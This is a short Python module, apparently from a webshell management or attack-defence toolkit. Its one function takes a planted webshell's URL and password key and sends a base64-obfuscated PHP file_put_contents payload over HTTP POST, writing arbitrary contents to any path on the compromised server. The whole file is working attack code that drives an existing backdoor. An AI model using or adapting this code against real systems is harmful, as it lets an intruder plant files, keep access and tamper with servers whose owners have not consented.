#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import requests
sys.path.append('..')
from utils import Utils
from configuration import configuration as config

class WriteFailException(Exception):
    """write file failed"""

def write_local(shell, key, path, contents):
    shellcode = Utils.base64(contents)
    pathcode = Utils.base64(path)
    data = {
        key: "file_put_contents(base64_decode('{}'),base64_decode('{}'));".format(pathcode, shellcode)
    }
    # print(key, data[key])
    try:
        resp = requests.post(url=shell, data=data, headers=config.headers, timeout=5)
        if 200 == resp.status_code:
            return resp.text
        else:
            raise WriteFailException
    except:
        raise WriteFailException